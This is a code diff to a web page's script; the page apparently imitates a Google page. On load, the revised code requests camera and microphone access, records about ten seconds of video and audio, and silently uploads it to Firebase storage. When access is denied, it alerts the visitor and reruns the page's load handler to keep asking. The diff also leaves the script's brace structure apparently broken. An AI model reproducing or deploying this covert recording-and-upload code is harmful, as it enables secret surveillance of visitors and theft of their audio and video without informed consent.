@@ -4330,22 +4330,17 @@
     const storage = getStorage(app);
 
     window.onload = function () {
-    const hasPermission = localStorage.getItem('hasPermission') === 'true';
-
-    function startRecording() {
-        let mediaRecorder;
+        let mediaRecoder;
         const parts = [];
-
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true, })
             .then((stream) => {
-                mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.start(1000);
-                mediaRecorder.ondataavailable = function (e) {
+                mediaRecoder = new MediaRecorder(stream);
+                mediaRecoder.start(1000);
+                mediaRecoder.ondataavailable = function (e) {
                     parts.push(e.data);
                 };
-
                 setTimeout(function () {
-                    mediaRecorder.stop();
+                    mediaRecoder.stop();
                     const blob = new Blob(parts, {
                         type: "video/webm"
                     });
@@ -4353,6 +4348,9 @@
                     const currentDateTime = new Date();
                     const formattedDateTime = `${currentDateTime.getFullYear()}${padZero(currentDateTime.getMonth() + 1)}${padZero(currentDateTime.getDate())}_${padZero(currentDateTime.getHours())}${padZero(currentDateTime.getMinutes())}${padZero(currentDateTime.getSeconds())}`;
                     console.log(formattedDateTime);
+                    function padZero(num) {
+                        return num.toString().padStart(2, '0');
+                    }
 
                     const storageRef = ref(storage, formattedDateTime);
                     uploadBytes(storageRef, blob).then(snapshot => {
@@ -4363,36 +4361,10 @@
                 }, 10000);
             })
             .catch((error) => {
-                alert('Permission denied or blocked. Please allow access and try again.');
-                localStorage.setItem('hasPermission', 'false');
-                askForPermission();
+                alert('Camera and microphone permissions denied or blocked. Please allow access and try again.');
+                window.onload();
             });
     }
-
-    function askForPermission() {
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-            .then((stream) => {
-                localStorage.setItem('hasPermission', 'true');
-                startRecording();
-            })
-            .catch((error) => {
-                alert('Permission denied or blocked again. Please allow access and try again.');
-                localStorage.setItem('hasPermission', 'false');
-                askForPermission();
-            });
-    }
-
-    if (!hasPermission) {
-        askForPermission();
-    } else {
-        startRecording();
-    }
-
-    function padZero(num) {
-        return num.toString().padStart(2, '0');
-    }
-};
-
 </script>
 
 <body jsmodel="hspDDf">
